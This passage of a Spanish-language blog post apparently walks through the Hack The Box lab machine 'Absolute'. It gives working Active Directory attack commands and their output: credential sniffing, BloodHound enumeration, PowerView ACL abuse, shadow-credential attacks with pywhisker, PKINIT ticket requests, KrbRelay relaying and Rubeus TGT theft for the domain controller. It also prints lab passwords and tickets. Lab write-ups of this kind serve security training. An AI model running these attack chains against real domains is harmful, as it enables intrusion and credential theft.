+drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 ..
+<span class="nt">-rw-rw-rw-</span>         72  Thu Sep  1 12:02:23 2022 compiler.sh
+<span class="nt">-rw-rw-rw-</span>      67584  Thu Sep  1 12:02:23 2022 test.exe
+</pre></table></code></div></div><p>Aquí encontramos dos archivos, compiler.sh y test.exe que procedemos a descargar para saber que es lo que hacen. Nos abrimos nuestra máquina windows, al ejecutar el programa pareciera que no hace nada importante. Con ghidra no se encuentra algo útil, por lo que ponemos a prueba el binario. Primero nos conectamos a la vpn en nuestra máquina windows, después ponemos los dominios en el hosts de windows y con ayuda de wireshark interceptamos alguna petición de la red de la máquina. Con esto logramos interceptar unas credenciales que se autentican en el servicio ldap.</p><p><img data-src="/assets/images/Absolute/absolute3.png" alt="imagen3" data-proofer-ignore></p><p><img data-src="/assets/images/Absolute/absolute4.png" alt="imagen4" data-proofer-ignore></p><p>Regresamos a nuestra máquina y probamos las credenciales.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ crackmapexec ldap absolute.htb <span class="nt">-u</span> m.lovegod <span class="nt">-d</span> absolute.htb <span class="nt">-k</span> <span class="nt">--kdcHost</span> dc.absolute.htb
+SMB         absolute.htb    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP        absolute.htb    389    DC               <span class="o">[</span>+] absolute.htb<span class="se">\</span>
+</pre></table></code></div></div><p>Con esto podemos revisar dumpear información con bloodhound.py para revisar posibles rutas para elevar privilegios.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>❯ <span class="nb">sudo </span>python3 ./BloodHound.py-Kerberos/bloodhound.py <span class="nt">-u</span> m.lovegod <span class="nt">-k</span> <span class="nt">-d</span> absolute.htb <span class="nt">-dc</span> dc.absolute.htb <span class="nt">-ns</span> 10.10.11.181 <span class="nt">--dns-tcp</span> <span class="nt">--zip</span> <span class="nt">-no-pass</span> <span class="nt">-c</span> All
+INFO: Found AD domain: absolute.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal <span class="k">in </span>ccache file.
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 18 <span class="nb">users
+</span>INFO: Found 55 <span class="nb">groups
+</span>INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.absolute.htb
+INFO: Ignoring host dc.absolute.htb since its reported name  does not match
+INFO: Done <span class="k">in </span>00M 10S
+INFO: Compressing output into 20230301220041_bloodhound.zip
+</pre></table></code></div></div><p>Dentro del bloodhound vemos que el usuario m.lovegod es dueño del grupo Network Audit que tiene generic write sobre el usuario winrm_user.</p><p><img data-src="/assets/images/Absolute/absolute5.png" alt="imagen5" data-proofer-ignore></p><p>Para eso podemos usar powershell para importar PowerView.ps1 para que primero ingresemos al grupo Network Audit al usuario m.lovegod y después asignamos los permisos totales a este.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\gu3ro\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\gu3ro\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"AbsoluteLDAP2022!"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\gu3ro\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s2">"Absolute.htb\m.lovegod"</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\gu3ro\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"Network Audit"</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nt">-DomainController</span><span class="w"> </span><span class="nx">dc.absolute.htb</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="s2">"m.lovegod"</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\gu3ro\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Add-ADPrincipalGroupMembership</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">m.lovegod</span><span class="w"> </span><span class="nt">-MemberOf</span><span class="w"> </span><span class="s2">"Network Audit"</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-server</span><span class="w"> </span><span class="nx">dc.absolute.htb</span><span class="w">
+</span></pre></table></code></div></div><p>Haciendo esto ya podemos abusar del ACL asignado hacia el usuario winrm_usar. Para esto podemos usar primero pywhisker para editar el msD5-KeyCredentialLink para obtener un certificado y tener un archivo pfx para después obtener el TGT del usuario.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>❯ <span class="nb">sudo </span>python3 ./pywhisker/pywhisker.py <span class="nt">-d</span> absolute.htb <span class="nt">-u</span> m.lovegod <span class="nt">-t</span> winrm_user <span class="nt">-k</span> <span class="nt">--no-pass</span> <span class="nt">--action</span> add
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>the target account
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target user found: <span class="nv">CN</span><span class="o">=</span>winrm_user,CN<span class="o">=</span>Users,DC<span class="o">=</span>absolute,DC<span class="o">=</span>htb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating KeyCredential
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> KeyCredential generated with DeviceID: f3ec980c-8a84-5987-ebf9-81b6e9517a82
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Updating the msDS-KeyCredentialLink attribute of winrm_user
+<span class="o">[</span>+] Updated the msDS-KeyCredentialLink attribute of the target object
+<span class="o">[</span>+] Saved PFX <span class="o">(</span><span class="c">#PKCS12) certificate &amp; key at path: sEHe3twE.pfx</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Must be used with password: yYY7CyVyJeBXdRvbWyIG
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+</pre></table></code></div></div><p>Ahora usamos la herramienta gettgtpkinit para obtener el ticket guardándolo en la extensión ccache, al tener ya listo el ticket, podemos logearnos por winrm ya que el usuario está en el grupo de remote management users. Para hacer uso de kerberos en evil-winrm editamos el archivo /etc/krb5.conf para que pueda reconocer el dominio.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>❯ <span class="nb">sudo </span>python3 gettgtpkinit.py absolute.htb/winrm_user <span class="nt">-cert-pfx</span> ../sEHe3twE.pfx <span class="nt">-pfx-pass</span> yYY7CyVyJeBXdRvbWyIG winrm_user.ccache
+2023-03-02 00:37:47,379 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2023-03-02 00:37:47,393 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2023-03-02 00:38:44,940 minikerberos INFO     AS-REP encryption key <span class="o">(</span>you might need this later<span class="o">)</span>:
+INFO:minikerberos:AS-REP encryption key <span class="o">(</span>you might need this later<span class="o">)</span>:
+2023-03-02 00:38:44,940 minikerberos INFO     c147047fe12e34627390ecd8f2152f5ac3ea65fda83f53e6b1b409e518087abd
+INFO:minikerberos:c147047fe12e34627390ecd8f2152f5ac3ea65fda83f53e6b1b409e518087abd
+2023-03-02 00:38:44,943 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="o">[</span>libdefaults]
+        default_realm <span class="o">=</span> ABSOLUTE.HTB
+
+<span class="o">[</span>realms]
+        ABSOLUTE.HTB <span class="o">=</span> <span class="o">{</span>
+                kdc <span class="o">=</span> DC.ABSOLUTE.HTB
+                admin_server <span class="o">=</span> ABSOLUTE.HTB
+        <span class="o">}</span>
+</pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-i</span> DC.ABSOLUTE.HTB <span class="nt">-r</span> ABSOLUTE.HTB
+
+Evil-WinRM shell v3.4
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\w</span>inrm_user<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>absolute<span class="se">\w</span>inrm_user
+</pre></table></code></div></div><p>Para elevar nuestro privilegio primero enumeramos un poco la máquina.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\winrm_user\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\RunasCS.exe</span><span class="w"> </span><span class="nx">mlovegod</span><span class="w"> </span><span class="nx">AbsoluteLDAP2022</span><span class="o">!</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">absolute.htb</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">9</span><span class="w"> </span><span class="s2">"C:\Users\winrm_user\Documents\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid {752073A1-23F2-4396
+-85F0-8FDB879ED0ED} -shadowcred"</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Relaying</span><span class="w"> </span><span class="nx">context:</span><span class="w"> </span><span class="nx">absolute.htb\DC</span><span class="err">$</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Rewriting</span><span class="w"> </span><span class="nx">function</span><span class="w"> </span><span class="nx">table</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Rewriting</span><span class="w"> </span><span class="nx">PEB</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">GetModuleFileName:</span><span class="w"> </span><span class="nx">System</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Init</span><span class="w"> </span><span class="nx">com</span><span class="w"> </span><span class="nx">server</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">GetModuleFileName:</span><span class="w"> </span><span class="nx">C:\Users\winrm_user\Documents\KrbRelay.exe</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Register</span><span class="w"> </span><span class="nx">com</span><span class="w"> </span><span class="nx">server</span><span class="w">
+</span><span class="n">objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADQ/31yI6y</span><span class="o">+</span><span class="nx">UbaH1PermYnwAkAAANAM//8qzBCcv5l4QiIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA</span><span class="o">==</span><span class="p">:</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Forcing</span><span class="w"> </span><span class="nx">SYSTEM</span><span class="w"> </span><span class="nx">authentication</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">CLSID:</span><span class="w"> </span><span class="nx">752073a1-23f2-4396-85f0-8fdb879ed0ed</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">apReq:</span><span class="w"> </span><span class="nx">608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a04820486bfd91ef9cd23cf2f9f69de436633fafacd848793252ee1b54616bdcf7bfeb2608efbbe0d390ac0c8d4daf843a96c47e772cd9c39ae9a99cc699c87be9f12f89a2f14c36bd5035c1f9832117643ef40558eac4</span><span class="w">
+</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+</pre><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\winrm_user\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:DC</span><span class="err">$</span><span class="w"> </span><span class="nx">/certificate:MIIJsAIBAzCC</span><span class="err">&lt;</span><span class="nx">SNIP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/password:</span><span class="s2">"00126821-c60d-4966-9984-f318a969fc76"</span><span class="w"> </span><span class="nx">/getcredentials</span><span class="w"> </span><span class="nx">/show</span><span class="w">
+
+</span><span class="p">(</span><span class="err">_____</span><span class="w"> </span><span class="n">\</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">
+   </span><span class="err">_____</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="err">_</span><span class="w">   </span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">__</span><span class="w">  </span><span class="err">_____</span><span class="w"> </span><span class="err">_</span><span class="w">   </span><span class="err">_</span><span class="w">  </span><span class="err">___</span><span class="w">
+  </span><span class="o">|</span><span class="w">  </span><span class="err">__</span><span class="w">  </span><span class="n">/</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="err">_</span><span class="w"> </span><span class="n">\</span><span class="o">|</span><span class="w"> </span><span class="err">___</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="n">/___</span><span class="p">)</span><span class="w">
+  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="n">\</span><span class="w"> </span><span class="nx">\</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="err">____</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">___</span><span class="w"> </span><span class="o">|</span><span class="w">
+  </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="err">_</span><span class="o">|</span><span class="err">____</span><span class="n">/</span><span class="o">|</span><span class="err">____</span><span class="n">/</span><span class="o">|</span><span class="err">_____</span><span class="p">)</span><span class="err">____</span><span class="n">/</span><span class="p">(</span><span class="err">___</span><span class="n">/</span><span class="w">
+
+  </span><span class="n">v2.2.0</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Action:</span><span class="w"> </span><span class="nx">Ask</span><span class="w"> </span><span class="nx">TGT</span><span class="w">
+
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">PKINIT</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">etype</span><span class="w"> </span><span class="nx">rc4_hmac</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">subject:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">DC</span><span class="err">$</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Building</span><span class="w"> </span><span class="nx">AS-REQ</span><span class="w"> </span><span class="p">(</span><span class="n">w/</span><span class="w"> </span><span class="nx">PKINIT</span><span class="w"> </span><span class="nx">preauth</span><span class="p">)</span><span class="w"> </span><span class="kr">for</span><span class="p">:</span><span class="w"> </span><span class="s1">'absolute.htb\DC$'</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="n">domain</span><span class="w"> </span><span class="nx">controller:</span><span class="w"> </span><span class="nx">fe80::9436:fb41:7e70:2199</span><span class="o">%</span><span class="nx">11:88</span><span class="w">
+</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">TGT</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">
+</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">base64</span><span class="p">(</span><span class="n">ticket.kirbi</span><span class="p">):</span><span class="w">
+
+      </span><span class="n">doIGGDCCBhSgAwIBBaEDAgEWooIFMjCCBS5hggUqMIIFJqADAgEFoQ4bDEFCU09MVVRFLkhUQqIhMB</span><span class="o">+</span><span class="nx">g</span><span class="w">
+      </span><span class="n">AwIBAqEYMBYbBmtyYnRndBsMYWJzb2x1dGUuaHRio4IE6jCCBOagAwIBEqEDAgECooIE2ASCBNR/cmg0</span><span class="w">
+      </span><span class="nx">1cJZrpVSG4kWdqpCWp0IG3xlw1aZ4UCz1P7y3Qo1mimpxINetL4iYkiy150FYU4SvdS8jg</span><span class="o">+</span><span class="nx">9rse0ZYBF</span><span class="w">
+      </span><span class="n">BDW0N</span><span class="o">+</span><span class="nx">p6F</span><span class="o">+</span><span class="nx">tav4k</span><span class="o">+</span><span class="nx">aILGjrG9NoGv22LLQ4M</span><span class="o">+</span><span class="nx">X4REsSILdd7u99hzuMhqFqThnXlyEIzjq1LXtOlHbsKx</span><span class="w">
+      </span><span class="n">CkyaX4kHHKUOx/6jYDaGnXW9KefrJB8jyjUj5g/n5EUjmLYaI/Hnv61VBSQs/0b0fYVRGcFspNc/a</span><span class="o">+</span><span class="nx">uZ</span><span class="w">
+      </span><span class="n">KLtOwEdHsXmkcO/wPsSLu9M</span><span class="o">+</span><span class="nx">twDRVR70dhpNVq77/KsVGXFBaSMUcKNJ23Eo6</span><span class="o">+</span><span class="nx">Df53j06pecgQZKvDSR</span><span class="w">
+      </span><span class="n">M0PQtVZMy9MBPC1BoZlEPIYXWK8lLMM5WVPufohSlmBdat/zD9jOJCDoU6W5BLCkc8srZjPlcIwtb479</span><span class="w">
+      </span><span class="nx">TFSHf/ar4qfFcqGhIspTSsrVcw8ynI6Nht1chw/qcc2qmS6ueKb86fkZi/YvTQU0uCS/aUbx7mvWDBP/</span><span class="w">
+      </span><span class="n">SpePE1</span><span class="o">+</span><span class="nx">S49A</span><span class="o">+</span><span class="nx">9ON2YMniwQSUKTGIWItdfTCi</span><span class="o">+</span><span class="nx">LSXDtJj8W9KgWI5kLW/38eguofwRxRNP7pQSbs1fLhh</span><span class="w">
+      </span><span class="mi">6</span><span class="n">MIqwCqEXSU4qh9fmoU</span><span class="o">+</span><span class="nx">NtRueDMjxccN6snXqbsu0V4DOVsQWkki9JuIGzHS6Lg2E9CVrl02gYXlfzhh</span><span class="w">
+      </span><span class="n">FFQidNso5T2NWHZTy4al</span><span class="o">+</span><span class="nx">SPeHwxebGkbj5BuaUgQwDtIislKsOX5QosqDEe8lxS8uDiido6vBT0F2eHs</span><span class="w">
+      </span><span class="n">WXNMa5ndlZWCYhSj</span><span class="o">+</span><span class="nx">gTm8KJJ0z52kRcyVrnY7TNLTgaGc4mnUhk6O1j4MSRqLiNl6YXqpeL3DDoN68MD</span><span class="w">
+      </span><span class="mi">2</span><span class="n">zSe8qF0nWLRc</span><span class="o">+</span><span class="nx">n5v2Hi758Wawded2Rm3G/hrjxnf9ZMjuRTA2LVTl1PawKZTqSAjhsG7X91LY2Egl7a</span><span class="w">
+      </span><span class="n">PXiS6t2YncnoPya/dWoCYNpe5sYh2rBM0PkBT5LWTGpWzWgFwPwApIixNuI/H6OSzlAEH2EIACXFGtHq</span><span class="w">
+      </span><span class="nx">5VVM10U10CSuajI/PQSTnuTcR1AaI1QfOIVll0i35xIYUL6kRBpXMJmni2zQlC2pfRIKSmGc7KCe8moo</span><span class="w">
+      </span><span class="n">s/p9jfUg7BeeOfooqKGGap8w7GTniN</span><span class="o">+</span><span class="nx">ztY3hYwcuWkwWM4h/QbFfHSBo5Ok9zWmnhRJNZipIC5exHsg4</span><span class="w">
+      </span><span class="n">N/hJES3kvYmSckfi2UYsvIFXsMxL</span><span class="o">+</span><span class="nx">t2AT8Se0WlypN73wkFNO1v1krrEvNxrkUsljpQRixb0LJ81ad/F</span><span class="w">
+      </span><span class="n">P2pJvmTaD97oDvPQN02PWcptGRwzJV9zzDBAzmF</span><span class="o">+</span><span class="nx">QbROMgcDvjK7mLotbARuR2JyRlvBOjjKXVNLmF7i</span><span class="w">
+      </span><span class="n">Y38VB</span><span class="o">+</span><span class="nx">t4btYrKQP</span><span class="o">+</span><span class="nx">Me0rF2</span><span class="o">+</span><span class="nx">WyNaE/TohkSCJPHzkt/L4b7bQec739HjH8irhHk9V5g8/TiQi8S1hPeVZ</span><span class="w">
+      </span><span class="n">abKAibwygVrtvX18rha54mLVMp08tjvTTn/qHemTZ4vZ</span><span class="o">+</span><span class="nx">Y7fqWC/gPNmB/E32Ukee7FRfvPWkTqbkqKC</span><span class="w">
+      </span><span class="n">hlvsiHrVFgIcThvT2vNKC8e5a6G2RItaYoK9yZ88DiQ8ryJw8j7XCaIWJsDCiI3NKy/Udl1j/2jbKD65</span><span class="w">
+      </span><span class="nx">sbj9SAxCV8KUU1LJbhrLFOzo7EM8HpFbB51Dq3p8lN4z</span><span class="o">+</span><span class="nx">xDF8WSc</span><span class="o">+</span><span class="nx">4/ZTaesyVmYn5d4/V6HFPw08pUJ</span><span class="w">
+      </span><span class="n">di3922kTaa5/cHA2Ltxgct5Z</span><span class="o">+</span><span class="nx">QYXJX2RD5RY4Kkw7cWjgdEwgc6gAwIBAKKBxgSBw32BwDCBvaCBujCB</span><span class="w">
+      </span><span class="n">tzCBtKAbMBmgAwIBF6ESBBDraGcQ4ROnjEM2hg9HSDG9oQ4bDEFCU09MVVRFLkhUQqIQMA6gAwIBAaEH</span><span class="w">
+      </span><span class="nx">MAUbA0RDJKMHAwUAQOEAAKURGA8yMDIzMDMwMjA3NTc0NVqmERgPMjAyMzAzMDIxNzU3NDVapxEYDzIw</span><span class="w">
+      </span><span class="n">MjMwMzA5MDc1NzQ1WqgOGwxBQlNPTFVURS5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGFic29sdXRl</span><span class="w">
+      </span><span class="nx">Lmh0Yg</span><span class="o">==</span><span class="w">
+
+  </span><span class="n">ServiceName</span><span class="w">              </span><span class="p">:</span><span class="w">  </span><span class="nx">krbtgt/absolute.htb</span><span class="w">
+  </span><span class="n">ServiceRealm</span><span class="w">             </span><span class="p">:</span><span class="w">  </span><span class="nx">ABSOLUTE.HTB</span><span class="w">
+  </span><span class="n">UserName</span><span class="w">                 </span><span class="p">:</span><span class="w">  </span><span class="nx">DC</span><span class="err">$</span><span class="w">
+  </span><span class="n">UserRealm</span><span class="w">                </span><span class="p">:</span><span class="w">  </span><span class="nx">ABSOLUTE.HTB</span><span class="w">
+  </span><span class="n">StartTime</span><span class="w">                </span><span class="p">:</span><span class="w">  </span><span class="nx">3/1/2023</span><span class="w"> </span><span class="nx">11:57:45</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+  </span><span class="n">EndTime</span><span class="w">                  </span><span class="p">:</span><span class="w">  </span><span class="nx">3/2/2023</span><span class="w"> </span><span class="nx">9:57:45</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+  </span><span class="n">RenewTill</span><span class="w">                </span><span class="p">:</span><span class="w">  </span><span class="nx">3/8/2023</span><span class="w"> </span><span class="nx">11:57:45</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+  </span><span class="n">Flags</span><span class="w">                    </span><span class="p">:</span><span class="w">  </span><span class="nx">name_canonicalize</span><span class="p">,</span><span class="w"> </span><span class="nx">pre_authent</span><span class="p">,</span><span class="w"> </span><span class="nx">initial</span><span class="p">,</span><span class="w"> </span><span class="nx">renewable</span><span class="p">,</span><span class="w"> </span><span class="nx">forwardable</span><span class="w">
+  </span><span class="n">KeyType</span><span class="w">                  </span><span class="p">:</span><span class="w">  </span><span class="nx">rc4_hmac</span><span class="w">
+  </span><span class="n">Base64</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="w">              </span><span class="p">:</span><span class="w">  </span><span class="mi">62</span><span class="n">hnEOETp4xDNoYPR0gxvQ</span><span class="o">==</span><span class="w">
+  </span><span class="n">ASREP</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="w">              </span><span class="p">:</span><span class="w">  </span><span class="n">CFD37A11CE5BC746664A8FC39FDFB4BE</span><span class="w">
+
